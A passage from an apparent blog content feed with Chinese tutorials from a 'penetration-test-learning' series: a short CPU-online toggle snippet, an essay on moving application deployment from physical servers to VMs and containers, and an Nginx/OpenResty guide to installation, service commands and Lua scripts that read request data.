如果主机有多CPU，为了验证效果，可以进行如下操作</strong></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># lscpu</span><span class="token comment"># echo 0 &gt; /sys/devices/system/cpu/cpu0/online</span><span class="token comment"># echo 1 &gt; /sys/devices/system/cpu/cpu1/online</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2023/07/16/penetration-test-learning/part-2-infiltration-and-defense/54-rong-qi-guan-li-gong-ju-docker/01-ying-yong-bu-shu-rong-qi-hua-yan-jin-zhi-lu/ying-yong-app-bu-shu-rong-qi-hua-yan-jin-zhi-lu/"/>
      <url>/2023/07/16/penetration-test-learning/part-2-infiltration-and-defense/54-rong-qi-guan-li-gong-ju-docker/01-ying-yong-bu-shu-rong-qi-hua-yan-jin-zhi-lu/ying-yong-app-bu-shu-rong-qi-hua-yan-jin-zhi-lu/</url>
      
        <content type="html"><![CDATA[<h1 id="应用（Application）部署容器化演进之路"><a href="#应用（Application）部署容器化演进之路" class="headerlink" title="应用（Application）部署容器化演进之路"></a>应用（Application）部署容器化演进之路</h1><h1 id="一、应用程序部署痛点"><a href="#一、应用程序部署痛点" class="headerlink" title="一、应用程序部署痛点"></a>一、应用程序部署痛点</h1><h2 id="1-1-应用程序部署流程"><a href="#1-1-应用程序部署流程" class="headerlink" title="1.1 应用程序部署流程"></a>1.1 应用程序部署流程</h2><p><strong>举例：部署一个JAVA编程语言开发的Web应用，以War包放入Tomcat方式部署。</strong></p><ul><li>部署过程如下：<ul><li>服务器配置运行环境:JAVA代码运行环境，例如JDK或JRE</li><li>服务器上安装Tomcat web中间件，用于运行War包</li><li>把JAVA Web对应的War包放置于Tomcat对应目录</li><li>在服务器上启动Tomcat应用</li><li>可选：涉及数据库（MySQL）或缓存系统(Redis)等都需要逐一部署。</li></ul></li></ul><h2 id="1-2-应用程序扩缩容"><a href="#1-2-应用程序扩缩容" class="headerlink" title="1.2 应用程序扩缩容"></a>1.2 应用程序扩缩容</h2><ul><li>涉及多台服务器部署相同的上述环境</li><li>痛点：上述环境部署要重新实施一遍，较浪费人力与物力成本</li></ul><h2 id="1-3-应用程序多环境部署"><a href="#1-3-应用程序多环境部署" class="headerlink" title="1.3 应用程序多环境部署"></a>1.3 应用程序多环境部署</h2><ul><li>环境：本地测试环境、预发布环境、生产环境</li><li>在本地测试环境运行没有问题，但在预发布环境中出现了问题，甚至上面2种环境都没有问题，到了生产环境就有问题了。</li><li>需求：一次成功，可到处运行。</li></ul><h1 id="二、-计算资源应用演进过程"><a href="#二、-计算资源应用演进过程" class="headerlink" title="二、 计算资源应用演进过程"></a>二、 计算资源应用演进过程</h1><h2 id="2-1-使用物理服务器痛点"><a href="#2-1-使用物理服务器痛点" class="headerlink" title="2.1 使用物理服务器痛点"></a>2.1 使用物理服务器痛点</h2><p><img src="%E5%BA%94%E7%94%A8%EF%BC%88APP%EF%BC%89%E9%83%A8%E7%BD%B2%E5%AE%B9%E5%99%A8%E5%8C%96%E6%BC%94%E8%BF%9B%E4%B9%8B%E8%B7%AF.assets/image-20220118161531257.png" alt="image-20220118161531257"></p><ul><li><p>从物理服务器自身管理角度</p><ul><li>物理服务器环境部署人力成本大，特别是在自动化手段不足的情况下，依靠人肉运维的方式解决。</li><li>当物理服务器出现宕机后，服务器重启时间过长，短则1-2分钟，长则3-5分钟，有背于服务器在线时长达到99.999999999%标准的要求</li><li>物理服务器在应用程序运行期间硬件出现故障，解决较麻烦</li><li>物理服务器计算资源不能有效调度使用，无法发挥其充足资源的优势</li></ul></li><li><p>从物理服务器部署应用程序角度</p><ul><li>物理服务器环境部署浪费时间，没有自动化运维手段，时间是成倍增加的</li><li>在物理服务器上进行应用程序配置变更，需要重新实施前述步骤</li></ul></li></ul><h2 id="2-2-使用虚拟机优点与缺点"><a href="#2-2-使用虚拟机优点与缺点" class="headerlink" title="2.2 使用虚拟机优点与缺点"></a>2.2 使用虚拟机优点与缺点</h2><p><img src="%E5%BA%94%E7%94%A8%EF%BC%88APP%EF%BC%89%E9%83%A8%E7%BD%B2%E5%AE%B9%E5%99%A8%E5%8C%96%E6%BC%94%E8%BF%9B%E4%B9%8B%E8%B7%AF.assets/image-20220118161210084.png" alt="image-20220118161210084"></p><h3 id="2-2-1-使用虚拟机优秀点"><a href="#2-2-1-使用虚拟机优秀点" class="headerlink" title="2.2.1 使用虚拟机优秀点"></a>2.2.1 使用虚拟机优秀点</h3><ul><li><p>从虚拟机本身管理角度</p><ul><li>虚拟机较物理服务器轻量，可借助虚拟机模板实现虚拟机快捷生成及应用</li><li>虚拟机中部署应用与物理服务器一样可控性强，且当虚拟机出现故障时，可直接使用新的虚拟机代替</li><li>在物理服务器中使用虚拟机可高效使用物理服务器的资源</li><li>虚拟机与物理服务器一样可达到良好的应用程序运行环境的隔离</li></ul></li><li><p>从在虚拟机中部署应用程序角度</p><ul><li>在虚拟机中部署应用，容易扩容及缩容实现</li><li>与物理服务器相比较，当部署应用程序的虚拟机出现宕机时，可以快速启动，时间通常可达秒级，10秒或20秒即可启动，应用程序可以继续提供服务</li><li>应用程序迁移方便</li></ul></li></ul><h3 id="2-2-2-使用虚拟机缺点"><a href="#2-2-2-使用虚拟机缺点" class="headerlink" title="2.2.2 使用虚拟机缺点"></a>2.2.2 使用虚拟机缺点</h3><ul><li>虚拟机管理软件本身占用物理服务器计算资源较多，例如:VMware Workstation Pro就会占用物理服务器大量资源，所以一般在企业应用中使用KVM虚拟机较多。</li><li>虚拟机底层硬件消耗物理服务器资源较大，例如：虚拟机操作系统硬盘，会直接占用大量物理服务器硬盘空间</li><li>相较于容器技术，虚拟机启动时间过长，容器启动可按毫秒级计算</li><li>虚拟机对物理服务器硬件资源调用添加了调链条，存在浪费时间的现象，所以虚拟机性能弱于物理服务器</li><li>由于应用程序是直接部署在虚拟机硬盘上，应用程序迁移时，需要连同虚拟机硬盘中的操作系统一同迁移，会导致迁移文件过大，浪费更多的存储空间及时间消耗过长</li></ul><h2 id="2-3-使用容器的优点与缺点"><a href="#2-3-使用容器的优点与缺点" class="headerlink" title="2.3 使用容器的优点与缺点"></a>2.3 使用容器的优点与缺点</h2><p><img src="%E5%BA%94%E7%94%A8%EF%BC%88APP%EF%BC%89%E9%83%A8%E7%BD%B2%E5%AE%B9%E5%99%A8%E5%8C%96%E6%BC%94%E8%BF%9B%E4%B9%8B%E8%B7%AF.assets/image-20220118161301903.png" alt="image-20220118161301903"></p><h3 id="2-3-1-使用容器的优点"><a href="#2-3-1-使用容器的优点" class="headerlink" title="2.3.1 使用容器的优点"></a>2.3.1 使用容器的优点</h3><ul><li>不需要为容器安装操作系统，可以节约大量时间</li><li>不需要通过手动的方式在容器中部署应用程序的运行环境，直接部署应用就可以了</li><li>不需要管理容器网络，以自动调用的方式访问容器中应用提供的服务</li><li>方便分享与构建应用容器，一次构建，到处运行</li><li>毫秒级启动</li><li>容器可直接使用物理服务器硬件资源，物理服务器硬件资源利用率高，性能较好。</li></ul><h3 id="2-3-2-使用容器的缺点"><a href="#2-3-2-使用容器的缺点" class="headerlink" title="2.3.2 使用容器的缺点"></a>2.3.2 使用容器的缺点</h3><p>对于对使用物理服务器、虚拟机已成为习惯的小伙伴来说，容器化可控性不强，最直观的就是对容器管理访问，总想按物理服务器或虚拟机的方式去管理它，其实容器与物理服务器、虚拟机管理方式上有着本质的区别的，最好不要管理。</p><h1 id="三、-What-is-a-Container"><a href="#三、-What-is-a-Container" class="headerlink" title="三、 What is a Container?"></a>三、 What is a Container?</h1><h2 id="3-1-容器定义"><a href="#3-1-容器定义" class="headerlink" title="3.1 容器定义"></a>3.1 容器定义</h2><p><img src="%E5%BA%94%E7%94%A8%EF%BC%88APP%EF%BC%89%E9%83%A8%E7%BD%B2%E5%AE%B9%E5%99%A8%E5%8C%96%E6%BC%94%E8%BF%9B%E4%B9%8B%E8%B7%AF.assets/image-20220118161407959.png" alt="image-20220118161407959"></p><ul><li><p>虚拟机</p><ul><li>采用虚拟化技术手段实现物理服务器计算资源打包的方式，为应用程序提供类物理服务器运行环境</li><li>能够实现应用程序与应用程序之间的隔离</li><li>使用自动化技术部署应用程序及应用程序迁移较方便</li><li>可横向扩展</li></ul></li><li><p>容器</p><ul><li>容器是轻量级物理服务器计算资源的打包方式，即轻量级虚拟机，为应用程序提供类虚拟机运行环境。</li><li>可在物理服务器中实现高密度部署</li></ul></li><li><p>容器与虚拟机对比</p></li></ul><table><thead><tr><th>对比属性</th><th>容器（Container）</th><th>虚拟机（VM）</th></tr></thead><tbody><tr><td>隔离性</td><td>基于进程隔离</td><td>提供资源的完全隔离</td></tr><tr><td>启动时间</td><td>毫秒级或秒级</td><td>秒级或分钟级</td></tr><tr><td>内核</td><td>共用宿主机内核</td><td>使用独立内核</td></tr><tr><td>占用资源</td><td>MB级</td><td>GB级</td></tr><tr><td>系统支持容量（同级别）</td><td>支持上千个容器</td><td>几十台虚拟机</td></tr></tbody></table><h2 id="3-2-容器功能"><a href="#3-2-容器功能" class="headerlink" title="3.2 容器功能"></a>3.2 容器功能</h2><ul><li><p>安装容器管理工具，例如Docker,Containerd等，把应用以容器化的方式运行</p></li><li><p>应用在自己的容器中运行，实现应用程序间隔离</p></li><li><p>应用程序运行的容器可以生成应用程序模板文件，即容器镜像（Image），其不可变，即为云原生代表技术基础设施不可变,且可以在其它的物理服务器中运行。</p></li></ul><h2 id="3-3-容器解决了什么问题"><a href="#3-3-容器解决了什么问题" class="headerlink" title="3.3 容器解决了什么问题"></a>3.3 容器解决了什么问题</h2><ul><li>快速交付和部署应用 (镜像与容器)</li><li>资源的高效利用和隔离 (在物理机上实现高密度部署)</li><li>便捷迁移和扩缩容(一次构建，多处运行)</li></ul><h1 id="四、使用容器步骤"><a href="#四、使用容器步骤" class="headerlink" title="四、使用容器步骤"></a>四、使用容器步骤</h1><ul><li><p>安装容器管理工具 </p><ul><li>Docker   (Docker公司)</li><li>Containerd  (2017年docker捐给CNCF云原生计算基金会)</li><li>Pouch  (阿里云)</li></ul></li><li><p>搜索/下载容器镜像(Image)</p></li><li><p>使用容器镜像生成容器(容器镜像中的应用程序启动)</p></li><li><p>终端用户(互联网用户或其它应用程序)访问</p></li><li><p>迁移部署(可直接把正在运行的容器打包成新的容器镜像，在其它主机上运行即可。)</p></li></ul>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2023/07/16/penetration-test-learning/part-2-infiltration-and-defense/50nginx-ji-chu-ying-yong-shi-zhan/nginx-ji-chu-ying-yong-shi-zhan-06/"/>
      <url>/2023/07/16/penetration-test-learning/part-2-infiltration-and-defense/50nginx-ji-chu-ying-yong-shi-zhan/nginx-ji-chu-ying-yong-shi-zhan-06/</url>
      
        <content type="html"><![CDATA[<h1 id="Nginx-基础应用实战-06"><a href="#Nginx-基础应用实战-06" class="headerlink" title="Nginx 基础应用实战 06"></a>Nginx 基础应用实战 06</h1><h2 id="构建一个PHP的站点"><a href="#构建一个PHP的站点" class="headerlink" title="构建一个PHP的站点"></a>构建一个PHP的站点</h2><p>使用套件</p><p>lmnp</p><p><a href="https://oneinstack.com/">https://oneinstack.com</a></p><h3 id="安装完成后"><a href="#安装完成后" class="headerlink" title="安装完成后"></a>安装完成后</h3><p><img src="images/image-20210521190719162.png" alt="image-20210521191847266"></p><h3 id="搭建bbs"><a href="#搭建bbs" class="headerlink" title="搭建bbs"></a>搭建bbs</h3><p><a href="https://www.discuz.net/">https://www.discuz.net/</a></p><h3 id="搭建博客"><a href="#搭建博客" class="headerlink" title="搭建博客"></a>搭建博客</h3><p><a href="https://wordpress.com/">https://wordpress.com</a></p><p><a href="https://cn.wordpress.org/">https://cn.wordpress.org/</a></p><h3 id="CMS系统"><a href="#CMS系统" class="headerlink" title="CMS系统"></a>CMS系统</h3><p><a href="http://www.dedecms.com/">http://www.dedecms.com/</a></p><h2 id="构建Lua站点"><a href="#构建Lua站点" class="headerlink" title="构建Lua站点"></a>构建Lua站点</h2><h2 id="Openresty-Nginx-Lua"><a href="#Openresty-Nginx-Lua" class="headerlink" title="Openresty Nginx + Lua"></a>Openresty Nginx + Lua</h2><p>Nginx是一个主进程配合多个工作进程的工作模式，每个进程由单个线程来处理多个连接。</p><p>在生产环境中，我们往往会把cpu内核直接绑定到工作进程上，从而提升性能。</p><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><h4 id="预编译安装"><a href="#预编译安装" class="headerlink" title="预编译安装"></a>预编译安装</h4><h1 id="CentOS"><a href="#CentOS" class="headerlink" title="CentOS"></a>CentOS</h1><p>你可以在你的 CentOS 系统中添加 <code>openresty</code> 仓库，这样就可以便于未来安装或更新我们的软件包（通过 <code>yum check-update</code> 命令）。 运行下面的命令就可以添加我们的仓库（对于 CentOS 8 或以上版本，应将下面的 <code>yum</code> 都替换成 <code>dnf</code>）：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># add the yum repo:</span><span class="token function">wget</span> https://openresty.org/package/centos/openresty.repo<span class="token function">sudo</span> <span class="token function">mv</span> openresty.repo /etc/yum.repos.d/<span class="token comment"># update the yum index:</span><span class="token function">sudo</span> yum check-update<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后就可以像下面这样安装软件包，比如 <code>openresty</code>：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> yum <span class="token function">install</span> <span class="token parameter variable">-y</span> openresty<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如果你想安装命令行工具 <code>resty</code>，那么可以像下面这样安装 <code>openresty-resty</code> 包：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> yum <span class="token function">install</span> <span class="token parameter variable">-y</span> openresty-resty<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>命令行工具 <code>opm</code> 在 <code>openresty-opm</code> 包里，而 <code>restydoc</code> 工具在 <code>openresty-doc</code> 包里头。</p><p>列出所有 <code>openresty</code> 仓库里头的软件包：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> yum <span class="token parameter variable">--disablerepo</span><span class="token operator">=</span><span class="token string">"*"</span> <span class="token parameter variable">--enablerepo</span><span class="token operator">=</span><span class="token string">"openresty"</span> list available<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>参考 <a href="http://openresty.org/cn/rpm-packages.html">OpenResty RPM 包</a>页面获取这些包更多的细节。</p><p>对于 CentOS 8 及更新版本，我们只需要将上面的 <code>yum</code> 命令都替换成 <code>dnf</code> 即可。</p><h4 id="源码编译安装"><a href="#源码编译安装" class="headerlink" title="源码编译安装"></a>源码编译安装</h4><h4 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h4><p><a href="http://openresty.org/cn/download.html">http://openresty.org/cn/download.html</a></p><p><code>./configure</code></p><p>然后在进入 <code>openresty-VERSION/ </code>目录, 然后输入以下命令配置:</p><p> <code>./configure</code></p><p>默认, <code>--prefix=/usr/local/openresty</code> 程序会被安装到<code>/usr/local/openresty</code>目录。</p><p>依赖 <code>gcc openssl-devel pcre-devel zlib-devel</code></p><p>安装：<code>yum install gcc openssl-devel pcre-devel zlib-devel postgresql-devel</code></p><p>您可以指定各种选项，比如</p> <pre class="line-numbers language-none"><code class="language-none">./configure --prefix=/opt/openresty \            --with-luajit \            --without-http_redis2_module \            --with-http_iconv_module \            --with-http_postgres_module<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>试着使用 <code>./configure --help</code> 查看更多的选项。</p><p><code>make &amp;&amp; make install</code></p><h4 id="服务命令"><a href="#服务命令" class="headerlink" title="服务命令"></a>服务命令</h4><h5 id="启动"><a href="#启动" class="headerlink" title="启动"></a>启动</h5><p><code>systemctl start openresty.service</code></p><h5 id="停止"><a href="#停止" class="headerlink" title="停止"></a>停止</h5><p><code>systemctl stop openresty.service</code></p><p> 重新加载配置文件</p><p><code>systemctl reload openresty.service</code></p><h3 id="启动成功后的欢迎页面"><a href="#启动成功后的欢迎页面" class="headerlink" title="启动成功后的欢迎页面"></a>启动成功后的欢迎页面</h3><h5 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h5><p>如遇启动失败，先检查一下是否之前装过nginx 端口有没有冲突</p><p><img src="images/image-20210611184024696.png" alt="image-20210611184024696"></p><h5 id="查看已安装模块和版本号"><a href="#查看已安装模块和版本号" class="headerlink" title="查看已安装模块和版本号"></a>查看已安装模块和版本号</h5><p><code>Nginx -V</code></p><h3 id="测试lua脚本"><a href="#测试lua脚本" class="headerlink" title="测试lua脚本"></a>测试lua脚本</h3><pre class="line-numbers language-nginx" data-language="nginx"><code class="language-nginx">在Nginx.conf 中写入   <span class="token directive"><span class="token keyword">location</span> /lua</span> <span class="token punctuation">{</span>        <span class="token directive"><span class="token keyword">default_type</span> text/html</span><span class="token punctuation">;</span>        <span class="token directive"><span class="token keyword">content_by_lua</span> <span class="token string">'           ngx.say("&lt;p&gt;Hello, World!&lt;/p&gt;")         '</span></span><span class="token punctuation">;</span>      <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="lua-nginx-module"><a href="#lua-nginx-module" class="headerlink" title="lua-nginx-module"></a>lua-nginx-module</h3><h4 id="创建配置文件lua-conf"><a href="#创建配置文件lua-conf" class="headerlink" title="创建配置文件lua.conf"></a>创建配置文件lua.conf</h4><pre class="line-numbers language-nginx" data-language="nginx"><code class="language-nginx">   <span class="token directive"><span class="token keyword">server</span></span> <span class="token punctuation">{</span>        <span class="token directive"><span class="token keyword">listen</span>       <span class="token number">80</span></span><span class="token punctuation">;</span>        <span class="token directive"><span class="token keyword">server_name</span>  localhost</span><span class="token punctuation">;</span>   <span class="token directive"><span class="token keyword">location</span> /lua</span> <span class="token punctuation">{</span>        <span class="token directive"><span class="token keyword">default_type</span> text/html</span><span class="token punctuation">;</span>        <span class="token directive"><span class="token keyword">content_by_lua_file</span> conf/lua/hello.lua</span><span class="token punctuation">;</span>         <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="在Nginx-conf下引入lua配置"><a href="#在Nginx-conf下引入lua配置" class="headerlink" title="在Nginx.conf下引入lua配置"></a>在Nginx.conf下引入lua配置</h4><p><code>include       lua.conf;</code></p><h4 id="创建外部lua脚本"><a href="#创建外部lua脚本" class="headerlink" title="创建外部lua脚本"></a>创建外部lua脚本</h4><p><code>conf/lua/hello.lua</code></p><p>内容：</p><p><code>ngx.say("&lt;p&gt;Hello, World!&lt;/p&gt;")</code></p><h2 id="lua读取nginx数据的常用方法"><a href="#lua读取nginx数据的常用方法" class="headerlink" title="lua读取nginx数据的常用方法"></a>lua读取nginx数据的常用方法</h2><h3 id="ngx-var"><a href="#ngx-var" class="headerlink" title="ngx.var"></a>ngx.var</h3><h4 id="获取Nginx-uri中的单一变量"><a href="#获取Nginx-uri中的单一变量" class="headerlink" title="获取Nginx uri中的单一变量"></a>获取Nginx uri中的单一变量</h4> <pre class="line-numbers language-nginx" data-language="nginx"><code class="language-nginx"><span class="token directive"><span class="token keyword">location</span> /nginx_var</span> <span class="token punctuation">{</span>     <span class="token directive"><span class="token keyword">default_type</span> text/html</span><span class="token punctuation">;</span>    <span class="token directive"><span class="token keyword">content_by_lua_block</span></span> <span class="token punctuation">{</span>        ngx.say(ngx.var.arg_a)    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="ngx-req-get-uri-args"><a href="#ngx-req-get-uri-args" class="headerlink" title="ngx.req.get_uri_args"></a>ngx.req.get_uri_args</h3><h4 id="获取Nginx-uri中的所有变量"><a href="#获取Nginx-uri中的所有变量" class="headerlink" title="获取Nginx uri中的所有变量"></a>获取Nginx uri中的所有变量</h4><pre class="line-numbers language-lua" data-language="lua"><code class="language-lua"><span class="token keyword">local</span> uri_args <span class="token operator">=</span> ngx<span class="token punctuation">.</span>req<span class="token punctuation">.</span><span class="token function">get_uri_args</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token keyword">for</span> k<span class="token punctuation">,</span> v <span class="token keyword">in</span> <span class="token function">pairs</span><span class="token punctuation">(</span>uri_args<span class="token punctuation">)</span> <span class="token keyword">do</span>      <span class="token keyword">if</span> <span class="token function">type</span><span class="token punctuation">(</span>v<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">"table"</span> <span class="token keyword">then</span>          ngx<span class="token punctuation">.</span><span class="token function">say</span><span class="token punctuation">(</span>k<span class="token punctuation">,</span> <span class="token string">" : "</span><span class="token punctuation">,</span> table<span class="token punctuation">.</span><span class="token function">concat</span><span class="token punctuation">(</span>v<span class="token punctuation">,</span> <span class="token string">", "</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"&lt;br/&gt;"</span><span class="token punctuation">)</span>      <span class="token keyword">else</span>          ngx<span class="token punctuation">.</span><span class="token function">say</span><span class="token punctuation">(</span>k<span class="token punctuation">,</span> <span class="token string">": "</span><span class="token punctuation">,</span> v<span class="token punctuation">,</span> <span class="token string">"&lt;br/&gt;"</span><span class="token punctuation">)</span>      <span class="token keyword">end</span>  <span class="token keyword">end</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="lua文件热部署"><a href="#lua文件热部署" class="headerlink" title="lua文件热部署"></a>lua文件热部署</h2><pre class="line-numbers language-none"><code class="language-none">lua_code_cache off;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>关闭缓存后 重启生效</p><p>配置在 <code>http</code>-&gt;<code>server</code>节点下</p><p>只对<code>content_by_lua_file</code>生效</p><h4 id="获取Nginx请求头信息"><a href="#获取Nginx请求头信息" class="headerlink" title="获取Nginx请求头信息"></a>获取Nginx请求头信息</h4><pre class="line-numbers language-lua" data-language="lua"><code class="language-lua"><span class="token keyword">local</span> headers <span class="token operator">=</span> ngx<span class="token punctuation">.</span>req<span class="token punctuation">.</span><span class="token function">get_headers</span><span class="token punctuation">(</span><span class="token punctuation">)</span>                         ngx<span class="token punctuation">.</span><span class="token function">say</span><span class="token punctuation">(</span><span class="token string">"Host : "</span><span class="token punctuation">,</span> headers<span class="token punctuation">[</span><span class="token string">"Host"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">"&lt;br/&gt;"</span><span class="token punctuation">)</span>  ngx<span class="token punctuation">.</span><span class="token function">say</span><span class="token punctuation">(</span><span class="token string">"user-agent : "</span><span class="token punctuation">,</span> headers<span class="token punctuation">[</span><span class="token string">"user-agent"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">"&lt;br/&gt;"</span><span class="token punctuation">)</span>  ngx<span class="token punctuation">.</span><span class="token function">say</span><span class="token punctuation">(</span><span class="token string">"user-agent : "</span><span class="token punctuation">,</span> headers<span class="token punctuation">.</span>user_agent<span class="token punctuation">,</span> <span class="token string">"&lt;br/&gt;"</span><span class="token punctuation">)</span><span class="token keyword">for</span> k<span class="token punctuation">,</span>v <span class="token keyword">in</span> <span class="token function">pairs</span><span class="token punctuation">(</span>headers<span class="token punctuation">)</span> <span class="token keyword">do</span>      <span class="token keyword">if</span> <span class="token function">type</span><span class="token punctuation">(</span>v<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">"table"</span> <span class="token keyword">then</span>          ngx<span class="token punctuation">.</span><span class="token function">say</span><span class="token punctuation">(</span>k<span class="token punctuation">,</span> <span class="token string">" : "</span><span class="token punctuation">,</span> table<span class="token punctuation">.</span><span class="token function">concat</span><span class="token punctuation">(</span>v<span class="token punctuation">,</span> <span class="token string">","</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"&lt;br/&gt;"</span><span class="token punctuation">)</span>      <span class="token keyword">else</span>          ngx<span class="token punctuation">.</span><span class="token function">say</span><span class="token punctuation">(</span>k<span class="token punctuation">,</span> <span class="token string">" : "</span><span class="token punctuation">,</span> v<span class="token punctuation">,</span> <span class="token string">"&lt;br/&gt;"</span><span class="token punctuation">)</span>      <span class="token keyword">end</span>  <span class="token keyword">end</span>  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="获取post请求参数"><a href="#获取post请求参数" class="headerlink" title="获取post请求参数"></a>获取post请求参数</h4><pre class="line-numbers language-lua" data-language="lua"><code class="language-lua">ngx<span class="token punctuation">.</span>req<span class="token punctuation">.</span><span class="token function">read_body</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  ngx<span class="token punctuation">.</span><span class="token function">say</span><span class="token punctuation">(</span><span class="token string">"post args begin"</span><span class="token punctuation">,</span> <span class="token string">"&lt;br/&gt;"</span><span class="token punctuation">)</span>  <span class="token keyword">local</span> post_args <span class="token operator">=</span> ngx<span class="token punctuation">.</span>req<span class="token punctuation">.</span><span class="token function">get_post_args</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token keyword">for</span> k<span class="token punctuation">,</span> v <span class="token keyword">in</span> <span class="token function">pairs</span><span class="token punctuation">(</span>post_args<span class="token punctuation">)</span> <span class="token keyword">do</span>      <span class="token keyword">if</span> <span class="token function">type</span><span class="token punctuation">(</span>v<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">"table"</span> <span class="token keyword">then</span>          ngx<span class="token punctuation">.</span><span class="token function">say</span><span class="token punctuation">(</span>k<span class="token punctuation">,</span> <span class="token string">" : "</span><span class="token punctuation">,</span> table<span class="token punctuation">.</span><span class="token function">concat</span><span class="token punctuation">(</span>v<span class="token punctuation">,</span> <span class="token string">", "</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"&lt;br/&gt;"</span><span class="token punctuation">)</span>      <span class="token keyword">else</span>          ngx<span class="token punctuation">.</span><span class="token function">say</span><span class="token punctuation">(</span>k<span class="token punctuation">,</span> <span class="token string">": "</span><span class="token punctuation">,</span> v<span class="token punctuation">,</span> <span class="token string">"&lt;br/&gt;"</span><span class="token punctuation">)</span>      <span class="token keyword">end</span>  <span class="token keyword">end</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="http协议版本"><a href="#http协议版本" class="headerlink" title="http协议版本"></a>http协议版本</h4><pre class="line-numbers language-lua" data-language="lua"><code class="language-lua">ngx<span class="token punctuation">.</span><span class="token function">say</span><span class="token punctuation">(</span><span class="token string">"ngx.req.http_version : "</span><span class="token punctuation">,</span> ngx<span class="token punctuation">.</span>req<span class="token punctuation">.</span><span class="token function">http_version</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"&lt;br/&gt;"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="请求方法"><a href="#请求方法" class="headerlink" title="请求方法"></a>请求方法</h4><pre class="line-numbers language-lua" data-language="lua"><code class="language-lua">ngx<span class="token punctuation">.</span><span class="token function">say</span><span class="token punctuation">(</span><span class="token string">"ngx.req.get_method : "</span><span class="token punctuation">,</span> ngx<span class="token punctuation">.</span>req<span class="token punctuation">.</span><span class="token function">get_method</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"&lt;br/&gt;"</span><span class="token punctuation">)</span>  <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="原始的请求头内容"><a href="#原始的请求头内容" class="headerlink" title="原始的请求头内容"></a>原始的请求头内容</h4><pre class="line-numbers language-lua" data-language="lua"><code class="language-lua">ngx<span class="token punctuation">.</span><span class="token function">say</span><span class="token punctuation">(</span><span class="token string">"ngx.req.raw_header : "</span><span class="token punctuation">,</span>  ngx<span class="token punctuation">.</span>req<span class="token punctuation">.</span><span class="token function">raw_header</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"&lt;br/&gt;"</span><span class="token punctuation">)</span>  <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="body内容体"><a href="#body内容体" class="headerlink" title="body内容体"></a>body内容体</h4><p>ngx.say(“ngx.req.get_body_data() : “, ngx.req.get_body_data(), “<br>“)</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2023/07/16/penetration-test-learning/part-2-infiltration-and-defense/50nginx-ji-chu-ying-yong-shi-zhan/nginx-ji-chu-ying-yong-shi-zhan-04/"/>
      <url>/2023/07/16/penetration-test-learning/part-2-infiltration-and-defense/50nginx-ji-chu-ying-yong-shi-zhan/nginx-ji-chu-ying-yong-shi-zhan-04/</url>
      
